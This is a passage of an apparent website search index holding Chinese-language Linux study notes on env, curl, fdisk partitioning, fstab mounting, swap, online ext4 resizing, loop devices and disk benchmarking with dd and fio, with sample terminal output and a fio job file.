/path/to/directory\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#coreutils","title":"coreutils","text":"","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#env","title":"env","text":"<p>run command in a modifed environment</p> <p>env invocation (GNU Coreutils 9.5)</p> <ul> <li><code>-i</code><ul> <li><code>-</code></li> <li><code>--ignore-environment</code></li> <li>Start with an empty environment, ignoring the inherited environment.</li> </ul> </li> </ul> <pre><code>env -i PATH=\"$PATH\" foo  # \u9664\u4e86 PATH\uff0c\u4ee5\u7a7a\u767d env \u8fd0\u884c foo \u7a0b\u5e8f\u3002\nenv - PATH=\"$PATH\" foo  # \u7b80\u7565\u5f62\u5f0f\n</code></pre> <ul> <li><code>-C</code><ul> <li><code>--chdir=dir</code></li> <li>Change the working directory to\u00a0dir\u00a0before invoking\u00a0command.</li> </ul> </li> </ul> <pre><code>env --chdir=/build make\n</code></pre> <p>\u53e6\u5916\u7684\u4f5c\u7528\u5c31\u662f\uff0c\u7528\u4e8e\u811a\u672c\u6587\u4ef6\u7b2c\u4e00\u884c\uff0c\u7528\u4e8e\u627e\u5230\u6267\u884c\u6587\u4ef6\u6267\u884c</p> <p>When a script\u2019s interpreter is in a non-standard location in the\u00a0<code>PATH</code>\u00a0environment variable, it is recommended to use\u00a0<code>env</code>\u00a0on the first line of the script to find the executable and run it:</p> <pre><code>#!/bin/sh\n#!/usr/bin/python3\n\n#!/usr/bin/env bash\n#!/usr/bin/env python3\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#networking","title":"Networking","text":"","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#curl","title":"curl","text":"<ul> <li>-O, --remote-name<ul> <li>Write output to a local file named like the remote file we get. (Only the file part of the remote file is used, the path is cut off.)</li> <li>The  file will be saved in the current working directory</li> </ul> </li> <li><code>-L</code>:<ul> <li>follow \u91cd\u5b9a\u5411</li> </ul> </li> </ul> <p><code>curl -OL</code> \u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u540d\u5b57\uff0c\u800c wget \u5f97\u5230\u9519\u8bef\u7684\u540d\u5b57\uff0cwget --content-dispo \u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u540d\u5b57</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/","title":"linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4","text":"<p>\u5927\u7eb2</p> <ul> <li>how linux kernel boot<ul> <li>kernel parameters</li> <li>grub</li> </ul> </li> <li>how user space start<ul> <li>init, systemd</li> <li>initial RAM filesystem</li> </ul> </li> <li>Shell</li> <li>Disk and filesystem<ul> <li>partitioning disk</li> <li>mount </li> </ul> </li> <li>User identification, authentification, authorization<ul> <li>identi</li> <li>user, group \u5b9a\u4e49</li> <li>PAM</li> </ul> </li> <li>System configuration<ul> <li>Logging</li> <li>Batch jobs</li> </ul> </li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#disk-and-filesystem","title":"Disk and Filesystem","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#linux-\u5206\u533a","title":"linux \u5206\u533a","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#fdiskmkfsmount","title":"fdisk+mkfs+mount","text":"<p>\u4f7f\u7528 fdisk \u7ed9\u78c1\u76d8\u5206\u533a\u5e76\u6302\u8f7d</p> <p>\u5217\u51fa\u78c1\u76d8\u4fe1\u606f</p> <pre><code>sudo fdisk -l [device]\n</code></pre> <p>\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f</p> <pre><code>sudo fdisk [device]\n\nm #\u5e2e\u52a9\np #\u6253\u5370\u5f53\u524d\u5206\u533a\u8868\ng #\u521b\u5efagpt\u5206\u533a\u8868\nn #\u521b\u5efa\u5206\u533a\n</code></pre> <p>fdisk \u521b\u5efa\u5206\u533a\u540e</p> <ul> <li>\u901a\u8fc7<code>mkfs.ext4 /dev/sdb1</code>\u521b\u5efa\u6587\u4ef6 ext4 \u7cfb\u7edf\uff08p.s. \u6ce8\u610f\uff1a\u4e0d\u8981\u4f7f\u7528 sdb\uff0c\u800c\u662f sdb1 \u6307\u5b9a\u5206\u533a\uff09</li> </ul> <pre><code>mkfs.bfs     mkfs.cramfs  mkfs.ext2    mkfs.ext3    mkfs.ext4    mkfs.fat     mkfs.minix   mkfs.msdos   mkfs.ntfs    mkfs.vfat\n</code></pre> <ul> <li>\u901a\u8fc7<code>lsblk -f</code>\u663e\u793a UUID<ul> <li><code>-f</code>\u8868\u793a\u6253\u5370\u6587\u4ef6\u7cfb\u7edf</li> </ul> </li> <li> <p>\u5728<code>/etc/fstab</code>\u4e2d\u6dfb\u52a0\u6302\u8f7d\u6761\u76ee\uff0c\u7136\u540e<code>mount -a</code>\u8868\u793a\u6302\u8f7d fstab \u4e2d\u7684\u6240\u6709\u6761\u76ee   \u793a\u4f8b</p> <pre><code>UUID=b7ee63d0-6cea-4615-b7ec-63449c8fa566 /mnt/Disk1    ext4    defaults 0 0\n</code></pre> </li> </ul> <ul> <li>\u4fee\u6539\u6302\u8f7d\u70b9\u76ee\u5f55\u6743\u9650\uff0c\u9ed8\u8ba4\u53ea\u6709 root \u7528\u6237\u53ef\u4ee5\u8bbf\u95ee</li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#swap","title":"swap","text":"<pre><code>sudo dd if=/dev/zero of=/swapfile bs=1G count=16\nsudo mkswap swapfile\nsudo swapon swapfile\n\n#fstab \n/swapfile none swap sw 0 0\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#mount","title":"mount","text":"<p>Fstab - Community Help Wiki (ubuntu.com)</p> <p>mount \u53ea\u80fd\u7531 root \u7528\u6237\u64cd\u4f5c\uff0c\u5bfc\u81f4 mount \u7684\u76ee\u5f55\u6240\u6709\u8005\u4e3a root\uff0c\u666e\u901a\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee</p> <p>ext4 mount \u9009\u9879\u4e2d\u4e5f\u6ca1\u6709\u6307\u5b9a uid \u7684\u65b9\u5f0f\u6302\u8f7d\uff08\u4e0d\u50cfsmb\u6302\u8f7d\u65f6\uff09ext4(5) - Linux manual page (man7.org)</p> <p>\u5176\u5b9e\u4e0a\u9762\u6839\u672c\u4e0d\u662f\u95ee\u9898\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\uff1amount \u4e4b\u540e\u4f7f\u7528 chown \u547d\u4ee4\u5c06\u6302\u8f7d\u7684\u76ee\u5f55\u6539\u4e3a\u666e\u901a\u7528\u6237\u3002\u7531\u4e8e\u7528\u6237\u4fe1\u606f\u662f\u5199\u5165\u6587\u4ef6\u7cfb\u7edf\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6302\u8f7d\u65f6\u6587\u4ef6\u6743\u9650\u4ecd\u7136\u662f\u666e\u901a\u7528\u6237\u3002</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u6269\u5c55\u5206\u533a-expand-partition","title":"\u6269\u5c55\u5206\u533a expand partition","text":"<p>ext4\u53ef\u4ee5\u5728\u7ebf\u6269\u5c55\u5206\u533a\uff08\u6ce8\u610fshrink\u662f\u4e0d\u884c\u7684\uff09</p> <p>\u65b9\u6cd5\u5217\u4e3e\uff1a</p> <ul> <li>\u4f7f\u7528gparted\uff08\u7b80\u5355\uff0c\u4f46\u662f\u9047\u5230device busy\u7684\u60c5\u51b5\u4e5f\u675f\u624b\u65e0\u7b56\uff0c\u4e0d\u5982\u547d\u4ee4\u884c\u65f6\u77e5\u9053\u95ee\u9898\u51fa\u5728\u54ea\uff09</li> <li>fdisk\uff1a\u9700\u8981\u5148\u5220\u9664\u5206\u533a\uff08\u6ce8\u610f\u4e0d\u8981\u5220\u9664\u6587\u4ef6\u7cfb\u7edfsignature\uff09\uff0c\u7136\u540e\u91cd\u65b0\u521b\u5efa\uff0c\u4fdd\u8bc1\u8d77\u59cbsector\u76f8\u540c\u3002</li> <li>parted\uff1a\u6709resize\u547d\u4ee4\uff0c\u6269\u5c55\u5206\u533a\u65f6\u66f4\u5bb9\u6613\u3002\u4f46\u662f\u7531\u4e8e\u6bcf\u6b65\u64cd\u4f5c\u90fd\u4f1a\u7acb\u5373\u6267\u884c\uff0c\u6ca1\u6709fdisk\u90a3\u6837\u6709\u5b89\u5168\u611f\uff0c\u6700\u597d\u8fd8\u662f\u4e0d\u4f7f\u7528\u3002</li> <li>resize2fs\uff1a\u9ed8\u8ba4\u662f\u6269\u5c55\u6240\u6709\u7a7a\u95f4\u3002</li> </ul> <p>fdisk</p> <pre><code>yfy@u22-game:~$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda3        98G   17G   76G  19% /\n/dev/sda2       512M  6.1M  506M   2% /boot/efi\n</code></pre> <pre><code>root@u22-game:/home/yfy# fdisk /dev/sda\n\nCommand (m for help): p\n\nDisk /dev/sda: 120 GiB, 128849018880 bytes, 251658240 sectors\nDisk model: QEMU HARDDISK\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: 43AAA442-6CCE-4AC2-9389-0EE427839D73\n\nDevice       Start       End   Sectors  Size Type\n/dev/sda1     2048      4095      2048    1M BIOS boot\n/dev/sda2     4096   1054719   1050624  513M EFI System\n/dev/sda3  1054720 209713151 208658432 99.5G Linux filesystem\n\nCommand (m for help): F\nUnpartitioned space /dev/sda: 20 GiB, 21475868160 bytes, 41945055 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\n\n    Start       End  Sectors Size\n209713152 251658206 41945055  20G\n\nCommand (m for help): d\nPartition number (1-3, default 3):\n\nPartition 3 has been deleted.\n\nCommand (m for help): n\nPartition number (3-128, default 3):\nFirst sector (1054720-251658206, default 1054720):\nLast sector, +/-sectors or +/-size{K,M,G,T,P} (1054720-251658206, default 251658206): +110G\n\nCreated a new partition 3 of type 'Linux filesystem' and of size 110 GiB.\nPartition #3 contains a ext4 signature.\n\nDo you want to remove the signature? [Y]es/[N]o: N\n\nCommand (m for help): w\n\nThe partition table has been altered.\nSyncing disks.\n</code></pre> <pre><code>root@u22-game:~# df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda3        98G   17G   76G  19% /\n\nroot@u22-game:~# resize2fs /dev/sda3\nresize2fs 1.46.5 (30-Dec-2021)\nFilesystem at /dev/sda3 is mounted on /; on-line resizing required\nold_desc_blocks = 13, new_desc_blocks = 14\nThe filesystem on /dev/sda3 is now 28835840 (4k) blocks long.\n\nroot@u22-game:~# df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda3       108G   17G   86G  17% /\n</code></pre> <p>parted How to extend an EXT4 partition using parted and resize2fs - Knowledgebase - Cloud Services Store Limited resize2fs: 6.3.\u00a0Resizing an Ext4 File System Red Hat Enterprise Linux 6 | Red Hat Customer Portal</p> <p>\u5343\u4e07\u6ce8\u610f start sector \u9700\u8981\u4fdd\u6301\u4e00\u6837\u3002fdisk \u6709\u65f6\u4faf\u9ed8\u8ba4\u5e76\u4e0d\u4f1a\u4fdd\u6301\u4e0d\u53d8\u3002</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#device-or-resource-busy-\u600e\u4e48\u529e","title":"Device or resource busy \u600e\u4e48\u529e","text":"<pre><code>Command (m for help): w\nThe partition table has been altered.\nFailed to remove partition 3 from system: Device or resource busy\nFailed to remove partition 4 from system: Device or resource busy\nFailed to update system information about partition 2: Device or resource busy\nFailed to add partition 3 to system: Device or resource busy\n\nThe kernel still uses the old partitions. The new table will be used at the next reboot.\nSyncing disks.\n</code></pre> <p>\u6211\u91cd\u542f\u540e\u53d1\u73b0\uff0c\u5206\u533a\u5df2\u7ecf\u66f4\u65b0\u4e86\u3002resize2fs \u5373\u53ef</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#mkswap","title":"mkswap","text":"<pre><code>mkswap /dev/sdaX\nswapon /dev/sdaX\n\nswapon --show\n</code></pre> <pre><code>UUID=xxx none swap sw 0 0\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#linux-\u6302\u8f7d","title":"linux \u6302\u8f7d","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#losetup","title":"losetup","text":"<p>losetup is used to associate loop devices with regular files or block devices, to detach loop devices, and to query the status of a loop device.</p> <pre><code>losetup   # \u6253\u5370\u6240\u6709\u6302\u8f7d\u7684loopback\u8bbe\u5907\nlosetup -f --show default.img   # \u627e\u5230\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684loop\u8bbe\u5907\uff0c\u5e76\u6253\u5370\uff0c\u7136\u540e\u6302\u8f7ddefault.img\nlosetup -d loopdev      # detach\u6307\u5b9aloop\u8bbe\u5907\n-r, --read-only   # \u53ea\u8bfb\u6302\u8f7d\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u78c1\u76d8\u955c\u50cf","title":"\u78c1\u76d8\u955c\u50cf","text":"<p>\u7528\u4e8e\u6302\u8f7d\u5305\u542b\u5206\u533a\u8868\u7684\u78c1\u76d8\u955c\u50cf</p> <pre><code>sudo kpartx -av 20240702_NanoKVM_Rev1_1_0.img  # \u521b\u5efa /dev/mapper/loopXpY\n\nsudo kpartx -dv 20240702_NanoKVM_Rev1_1_0.img\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u6d4b\u8bd5\u78c1\u76d8\u901f\u5ea6","title":"\u6d4b\u8bd5\u78c1\u76d8\u901f\u5ea6","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dd","title":"dd","text":"<p>\u4f7f\u7528 dd \u7b80\u5355\u6d4b\u8bd5\u901f\u5ea6\u3002\u53ef\u4ee5\u533a\u5206 usb 2.0 \u548c 3.0\uff1b\u53ef\u4ee5\u89c1\u8bc6 PCIe 4.0 ssd \u7684\u901f\u5ea6\u3002\u4f46\u662f\u8981\u8fdb\u884c\u66f4\u51c6\u786e\u7684\u6d4b\u901f\uff0c\u6700\u597d\u4f7f\u7528 fio\u3002</p> <p>\u6ce8\u610f\u9700\u8981\u5f00\u542f direct\uff0c\u5426\u5219\u9700\u8981\u4ece userspace \u590d\u5236\u5230 kernel buffer\uff0c\u4e25\u91cd\u5f71\u54cd\u901f\u5ea6\u3002block size \u5bf9\u901f\u5ea6\u5f71\u54cd\u5f88\u5927\u3002 Why is dd with the 'direct' (O_DIRECT) flag so dramatically faster?</p> <ul> <li>bs \u5f71\u54cd\u5f88\u5927</li> <li>/dev/null\u4e0d\u9700\u8981\u4f7f\u7528oflag=direct</li> </ul> <pre><code>root@n5105-pve \u279c  dd of=/dev/null if=/mnt/wd-passport/fio.img bs=1M count=2000\n2000+0 records in\n2000+0 records out\n2097152000 bytes (2.1 GB, 2.0 GiB) copied, 21.2453 s, 98.7 MB/s\nroot@n5105-pve \u279c  dd if=/dev/zero of=/mnt/wd-passport/fio.img bs=1M count=2000\n2000+0 records in\n2000+0 records out\n2097152000 bytes (2.1 GB, 2.0 GiB) copied, 21.7685 s, 96.3 MB/s\nroot@n5105-pve \u279c  dd if=/dev/zero of=/mnt/wd-passport/fio.img bs=1M count=2000 oflag=direct\n2000+0 records in\n2000+0 records out\n2097152000 bytes (2.1 GB, 2.0 GiB) copied, 20.9127 s, 100 MB/s\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#fio","title":"fio","text":"<p>To benchmark\u00a0persistent disk performance, use\u00a0Flexible I/O tester (FIO)\u00a0instead of other disk benchmarking tools such as\u00a0<code>dd</code>. By default,\u00a0<code>dd</code>\u00a0uses a very low I/O queue depth, so it is difficult to ensure that the benchmark is generating a sufficient number of I/Os and bytes to accurately test disk performance.</p> <ul> <li>I/O type<ul> <li>direct, buffered, atomic. : O_DIRECT, O_ATOMIC</li> <li>readwrite=str, rw=str<ul> <li>read: Sequential reads.</li> <li>write: Sequential writes.</li> <li>randread: Random reads.</li> <li>randwrite: Random writes.</li> <li>rw,readwrite: Sequential mixed reads and writes</li> <li>randrw: Random mixed reads and writes.</li> <li>trim, randtrim, trimwrite</li> </ul> </li> </ul> </li> <li>Block size<ul> <li>bs: The block size in bytes used for I/O units</li> </ul> </li> <li>Buffer and Memory<ul> <li>sync=str<ul> <li>sync: Use synchronous file IO. O_SYNC</li> <li>dsync: Use synchronous data IO. For the majority of I/O engines, this means using O_DSYNC.</li> </ul> </li> </ul> </li> <li>I/O size<ul> <li>size: The total size of file I/O for each thread of this job. Fio will run until this many bytes has been transferred, unless runtime is limited by  other  options  (such  as  runtime, for instance, or increased/decreased by io_size).</li> </ul> </li> <li>I/O engine<ul> <li>ioengine=str<ul> <li>psync: Basic pread(2) or pwrite(2) I/O. Default on all supported operating systems except for Windows</li> <li>libaio:  Linux native asynchronous I/O. Note that Linux may only support queued behavior with non-buffered  I/O  (set  direct=1 or buffer=0).  This engine defines engine specific options.</li> </ul> </li> </ul> </li> <li>I/O depth<ul> <li>iodepth=int<ul> <li>Number of I/O units to keep in flight against the file. Note that increasing iodepth beyond 1 will not affect synchronous  ioengines  (except  for  small  degrees  when verify_async is in use). Even async engines may impose OS restrictions causing the desired depth not to be achieved. This may happen on Linux when using libaio and not setting <code>direct=1</code>', since buffered I/O is not async on that OS. Keep  an  eyeon the I/O depth distribution in the fio output to verify that the achieved depth is as expected. Default: 1.</li> </ul> </li> </ul> </li> <li>chatgpt4:<ul> <li>\u5f53 <code>iodepth</code> \u5927\u4e8e 1 \u65f6\uff0c<code>fio</code> \u4f1a\u5c1d\u8bd5\u540c\u65f6\u53d1\u8d77\u591a\u4e2a I/O \u8bf7\u6c42\uff0c\u4ee5\u6b64\u6765\u6a21\u62df\u5e76\u53d1 I/O \u8d1f\u8f7d\u3002\u8fd9\u5bf9\u4e8e\u8bc4\u4f30\u5b58\u50a8\u7cfb\u7edf\u5728\u9ad8\u5e76\u53d1\u573a\u666f\u4e0b\u7684\u6027\u80fd\u975e\u5e38\u6709\u7528\u3002</li> <li>\u5bf9\u4e8e\u540c\u6b65 I/O \u5f15\u64ce\uff08\u5982 <code>psync</code>\uff09\uff0c<code>iodepth</code> \u5927\u4e8e 1 \u7684\u8bbe\u7f6e\u5f71\u54cd\u4e0d\u5927\uff0c\u56e0\u4e3a\u540c\u6b65 I/O \u64cd\u4f5c\u4f1a\u6309\u987a\u5e8f\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u6267\u884c\u3002\u4f46\u662f\uff0c\u5728\u4f7f\u7528 <code>verify_async</code> \u9009\u9879\u65f6\uff0c\u5373\u4f7f\u662f\u540c\u6b65\u5f15\u64ce\uff0c\u5c06 <code>iodepth</code> \u8bbe\u7f6e\u5f97\u7a0d\u5fae\u5927\u4e8e 1 \u4e5f\u53ef\u80fd\u6709\u8f7b\u5fae\u7684\u5f71\u54cd\u3002</li> <li>\u5bf9\u4e8e\u5f02\u6b65 I/O \u5f15\u64ce\uff08\u5982 <code>libaio</code>\uff09\uff0c\u589e\u52a0 <code>iodepth</code> \u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u5e76\u53d1\u5ea6\u548c\u541e\u5410\u91cf\u3002\u7136\u800c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u548c\u5176\u5b83\u56e0\u7d20\u53ef\u80fd\u9650\u5236\u5b9e\u9645\u8fbe\u5230\u7684\u6df1\u5ea6\uff0c\u7279\u522b\u662f\u5728\u4e0d\u4f7f\u7528\u76f4\u63a5 I/O\uff08<code>direct=1</code>\uff09\u7684\u60c5\u51b5\u4e0b\u3002\u5728 Linux \u4e2d\uff0c\u5982\u679c\u4e0d\u8bbe\u7f6e <code>direct=1</code>\uff0c<code>libaio</code> \u4f7f\u7528\u7684\u662f\u7f13\u51b2 I/O\uff0c\u800c\u8fd9\u5728 Linux \u4e0a\u5e76\u4e0d\u662f\u5f02\u6b65\u7684\u3002</li> <li><code>fio</code> \u8f93\u51fa\u4e2d\u7684 I/O \u6df1\u5ea6\u5206\u5e03\u53ef\u4ee5\u5e2e\u52a9\u4f60\u9a8c\u8bc1\u5b9e\u9645\u8fbe\u5230\u7684\u6df1\u5ea6\u662f\u5426\u7b26\u5408\u9884\u671f\u3002</li> </ul> </li> </ul> <p>stonewall wait_for_previous  Wait for preceding jobs in the job file to exit, before starting this one. Can be used to insert serialization points in the job  file.  A stone  wall  also  implies  starting  a  new  reporting  group,  see  group_reporting.  Optionally you can use <code>stonewall=0</code> to disable or <code>stonewall=1</code> to enable it.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<ul> <li>global \u516c\u5171\u90e8\u5206\uff0c\u5f71\u54cd\u540e\u9762\u6bcf\u4e00\u4e2a job</li> <li>\u9ed8\u8ba4 job \u662f\u5e76\u884c\u7684\uff0c\u9700\u8981\u6dfb\u52a0 stonewall\u7b49\u5f85\u524d\u9762\u4e00\u4e2a\u5b8c\u6210</li> <li>filename \u6307\u5b9a\u5171\u540c\u4f7f\u7528\u4e00\u4e2a\u6587\u4ef6\uff08\u5426\u5219\u4f1a\u6839\u636e job \u540d\u81ea\u52a8\u751f\u6210\uff09</li> </ul> <pre><code>sudo fio --directory=/root/ --filename=test.bin ssd-win-likely.fio\n\nvim ssd-win-likely.fio #\u6a21\u4effwindows\u4e0bdiskmark\uff0c\u6d4b\u987a\u5e8f\u8bfb\u5199\u548c4k\u968f\u673a\n[global]\nioengine=libaio\nsize=10g\ndirect=1\nruntime=60\n\n[seq-read-4m]\nbs=4M\niodepth=32\nrw=read\nstonewall\n\n[seq-write-4m]\nbs=4M\niodepth=32\nrw=write\nstonewall\n\n[rand-read-4k]\nbs=4k\niodepth=4\nrw=randread\nstonewall\n\n[rand-write-4k]\nbs=4k\niodepth=4\nrw=randwrite\nstonewall\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u673a\u68b0\u786c\u76d8\u4f8b\u5b50","title":"\u673a\u68b0\u786c\u76d8\u4f8b\u5b50","text":"<ul> <li>dd read \u65f6\u9700\u8981\u6dfb\u52a0-iflag=direct\uff0c\u5426\u5219\u6d4b\u5f97\u901f\u5ea6 11GB/s<ul> <li>O_DIRECT\uff1a\u7ed5\u8fc7\u7cfb\u7edf\u7684\u9875\u7f13\u5b58\uff0c\u66f4\u51c6\u786e\u5730\u8861\u91cf\u78c1\u76d8\u672c\u8eab\u7684\u6027\u80fd\uff08</li> </ul> </li> <li>\u987a\u5e8f\u8bfb\u65f6\uff0c\u6d4b\u8bd5/dev/sda1 \u548c test.img \u901f\u5ea6\u662f\u4e0d\u540c\u7684 120 -&gt; 170 MB/s</li> <li>iodepth \u5f71\u54cd 1 -&gt; 8: 155 -&gt; 180 MB/s</li> <li>\u5728\u6211\u6d4b\u8bd5\u7684\u673a\u68b0\u786c\u76d8\u4e0a\uff0c\u589e\u52a0 jobnums \u63d0\u5347\u6ca1\u6709 iodepth \u660e\u663e</li> </ul> <pre><code>fio --filename=/dev/sda1 --bs=1M --direct=1 --iodepth=8 --numjobs 1 --group_reporting --size=1g --runtime=60 --name SeqRead --rw=read --ioengine=libaio --readonly\nSeqRead: (g=0): rw=read, bs=(R) 1024KiB-1024KiB, (W) 1024KiB-1024KiB, (T) 1024KiB-1024KiB, ioengine=libaio, iodepth=8\nfio-3.33\nStarting 1 process\nJobs: 1 (f=1): [R(1)][100.0%][r=166MiB/s][r=166 IOPS][eta 00m:00s]\nSeqRead: (groupid=0, jobs=1): err= 0: pid=884774: Wed Mar 13 17:09:47 2024\n  read: IOPS=168, BW=168MiB/s (177MB/s)(1024MiB/6078msec)\n    slat (usec): min=28, max=339, avg=46.65, stdev=27.34\n    clat (msec): min=30, max=240, avg=45.46, stdev=25.37\n     lat (msec): min=30, max=240, avg=45.51, stdev=25.37\n    clat percentiles (msec):\n     |  1.00th=[   40],  5.00th=[   40], 10.00th=[   40], 20.00th=[   40],\n     | 30.00th=[   40], 40.00th=[   40], 50.00th=[   42], 60.00th=[   43],\n     | 70.00th=[   43], 80.00th=[   45], 90.00th=[   45], 95.00th=[   46],\n     | 99.00th=[  234], 99.50th=[  241], 99.90th=[  241], 99.95th=[  241],\n     | 99.99th=[  241]\n   bw (  KiB/s): min=88064, max=202752, per=99.72%, avg=172032.00, stdev=40726.61, samples=12\n   iops        : min=   86, max=  198, avg=168.00, stdev=39.77, samples=12\n  lat (msec)   : 50=96.09%, 